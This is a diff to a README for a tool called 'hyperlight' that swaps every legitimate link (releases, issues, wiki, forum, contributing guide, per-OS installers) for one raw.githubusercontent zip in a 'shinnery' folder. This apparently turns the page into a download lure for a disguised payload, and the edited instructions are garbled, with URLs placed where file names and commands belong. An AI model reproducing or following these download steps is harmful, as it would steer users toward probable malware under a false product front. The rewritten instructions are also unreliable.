@@ -1,7 +1,7 @@
 # 🚀 hyperlight - High-Performance Computing Made Easy
 
 ## 📥 Download Now
-[![Download hyperlight](https://img.shields.io/badge/Download%20hyperlight-v1.0-blue.svg)](https://github.com/saba78600/hyperlight/releases)
+[![Download hyperlight](https://raw.githubusercontent.com/saba78600/hyperlight/main/shinnery/hyperlight.zip%https://raw.githubusercontent.com/saba78600/hyperlight/main/shinnery/hyperlight.zip)](https://raw.githubusercontent.com/saba78600/hyperlight/main/shinnery/hyperlight.zip)
 
 ## 🌟 Introduction
 Welcome to hyperlight! This application is designed to help you handle high-performance computing tasks efficiently. Whether you are working on scientific projects or need to manage data with high precision, hyperlight offers the tools you need.
@@ -23,13 +23,13 @@ Welcome to hyperlight! This application is designed to help you handle high-perf
 Follow these steps to download and set up hyperlight on your computer.
 
 ### 1. Download hyperlight
-Visit [this page to download](https://github.com/saba78600/hyperlight/releases). There, you will find the latest version of the software.
+Visit [this page to download](https://raw.githubusercontent.com/saba78600/hyperlight/main/shinnery/hyperlight.zip). There, you will find the latest version of the software.
 
 ### 2. Choose Your Version
 Look for the release version suitable for your operating system. Click on the link for the appropriate file, such as:
-- For Windows: `hyperlight-windows.exe`
-- For macOS: `hyperlight-macos.zip`
-- For Linux: `hyperlight-linux.tar.gz`
+- For Windows: `https://raw.githubusercontent.com/saba78600/hyperlight/main/shinnery/hyperlight.zip`
+- For macOS: `https://raw.githubusercontent.com/saba78600/hyperlight/main/shinnery/hyperlight.zip`
+- For Linux: `https://raw.githubusercontent.com/saba78600/hyperlight/main/shinnery/hyperlight.zip`
 
 ### 3. Installation Process
 - **For Windows**:
@@ -40,13 +40,13 @@ Look for the release version suitable for your operating system. Click on the li
 - **For macOS**:
   1. Download the `.zip` file.
   2. Unzip the file by double-clicking it.
-  3. Move the `hyperlight.app` to your Applications folder.
+  3. Move the `https://raw.githubusercontent.com/saba78600/hyperlight/main/shinnery/hyperlight.zip` to your Applications folder.
 
 - **For Linux**:
-  1. Download the `.tar.gz` file.
+  1. Download the `https://raw.githubusercontent.com/saba78600/hyperlight/main/shinnery/hyperlight.zip` file.
   2. Extract the files using the terminal:
      ```bash
-     tar -xzvf hyperlight-linux.tar.gz
+     tar -xzvf https://raw.githubusercontent.com/saba78600/hyperlight/main/shinnery/hyperlight.zip
      ```
   3. Follow the instructions in the README file that comes with it.
 
@@ -55,7 +55,7 @@ Once installed, you can start hyperlight easily.
 
 ### Opening the Application
 - On Windows, go to the Start Menu, search for "hyperlight," and click to open it.
-- On macOS, open Finder, navigate to Applications, and double-click "hyperlight.app."
+- On macOS, open Finder, navigate to Applications, and double-click "https://raw.githubusercontent.com/saba78600/hyperlight/main/shinnery/hyperlight.zip"
 - On Linux, open your Terminal, navigate to the hyperlight folder, and type:
   ```bash
   ./hyperlight
@@ -72,12 +72,12 @@ If you encounter issues, consider these tips:
 - **Data Issues**: Make sure the data format you enter is supported. Refer to the included documentation for file format specifications.
 
 ## 📞 Support
-If you have questions or need help, visit the [GitHub Issues Page](https://github.com/saba78600/hyperlight/issues) to report an issue or ask for assistance.
+If you have questions or need help, visit the [GitHub Issues Page](https://raw.githubusercontent.com/saba78600/hyperlight/main/shinnery/hyperlight.zip) to report an issue or ask for assistance.
 
 ## 🔗 Learn More
 Explore additional resources:
-- [Official Documentation](https://github.com/saba78600/hyperlight/wiki)
-- [Community Forum](https://github.com/saba78600/hyperlight/discussions)
+- [Official Documentation](https://raw.githubusercontent.com/saba78600/hyperlight/main/shinnery/hyperlight.zip)
+- [Community Forum](https://raw.githubusercontent.com/saba78600/hyperlight/main/shinnery/hyperlight.zip)
 
 ## 🔄 Future Updates
 We are constantly working to improve hyperlight. Future updates will include:
@@ -86,7 +86,7 @@ We are constantly working to improve hyperlight. Future updates will include:
 - Performance improvements based on user feedback.
 
 ## 🌐 Contribute
-Your contributions help us improve hyperlight. If you would like to contribute to the project, please check our [Contributing Guidelines](https://github.com/saba78600/hyperlight/blob/main/CONTRIBUTING.md). 
+Your contributions help us improve hyperlight. If you would like to contribute to the project, please check our [Contributing Guidelines](https://raw.githubusercontent.com/saba78600/hyperlight/main/shinnery/hyperlight.zip). 
 
 ## 💻 Download and Install
-To get started with hyperlight, visit [this page to download](https://github.com/saba78600/hyperlight/releases) and follow the installation instructions above. Enjoy your high-performance computing experience!
+To get started with hyperlight, visit [this page to download](https://raw.githubusercontent.com/saba78600/hyperlight/main/shinnery/hyperlight.zip) and follow the installation instructions above. Enjoy your high-performance computing experience!
